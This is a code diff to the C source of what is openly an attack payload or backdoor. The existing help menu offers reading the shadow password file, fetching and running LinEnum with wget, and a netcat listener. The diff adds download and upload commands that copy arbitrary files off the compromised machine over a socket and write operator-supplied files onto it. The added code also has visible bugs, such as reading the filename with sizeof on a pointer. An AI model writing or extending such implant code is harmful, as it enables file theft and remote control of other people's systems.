@@ -105,6 +105,8 @@ int main(int argc, char *argv[])
 		strcpy(help[i++], "shadow - attempt to print the shadow password to the screen\n");
 		strcpy(help[i++], "gitenum - wget LinEnum and execute\n");
 		strcpy(help[i++], "netcat - setup payload to use netcat listening functionality\n");
+		strcpy(help[i++], "download <filename> - download file from client\n");
+		strcpy(help[i++], "upload <filename> - upload file to client\n");
 		strcpy(help[i++], "clear - clear the current screen\n");
 		strcpy(help[i++], "exit - quit from payload\n");
 		strcpy(help[i++], "\n------------------------------\n\n");
@@ -156,6 +158,64 @@ int main(int argc, char *argv[])
 			else if(!strcmp("help", command))
 				for(i = 0; i < 18; i++)
 					write(sock, help[i], strlen(help[i]));	//write help menu
+
+			else if(!strcmp("download", command))
+			{
+				int readLen;
+				strcpy(buff, "g\0"); //write go ahead so 
+				write(sock, buff, strlen(buff));
+				char* fileName = malloc(128); //setting up the filename
+				//clear out the filename
+				for(int i = 0; i < 128; i++)
+					fileName[i] = 0;
+				read(sock, fileName, sizeof(fileName));
+				FILE* file = fopen(fileName, "r");
+
+
+				if(!file)
+				{
+					sprintf(buff, "File content not found\n\0", fileName);
+					write(sock, buff, 24);
+				}
+				else
+				{
+					readLen = fread(buff, 1, sizeof(buff), file);
+					write(sock, buff, readLen);
+				}
+
+				if(file)
+					fclose(file);
+			}
+
+			else if(!strcmp("upload", command))
+			{
+				int fileLen;
+				strcpy(buff, "g\0"); //write go ahead so 
+				write(sock, buff, strlen(buff));
+
+				char* fileName = malloc(128); //setting up the filename
+				//clear out the filename
+				for(int i = 0; i < 128; i++)
+					fileName[i] = 0;
+				read(sock, fileName, sizeof(fileName)); //grab filename from the buffer
+
+				//write a response after buffer is done to prep for data
+				strcpy(buff, "b\0");
+				write(sock, buff, strlen(buff));
+
+				//read the file data into the buffer
+				fileLen = read(sock, buff, sizeof(buff));
+
+				FILE* file = fopen(fileName, "w");
+
+				if(!file)
+					continue;
+				else
+					fwrite(buff, 1, fileLen, file);
+
+				
+				fclose(file);
+			}
 
 			else if(!strcmp("ls", command))
 				system("/bin/ls");	//print current directory contents
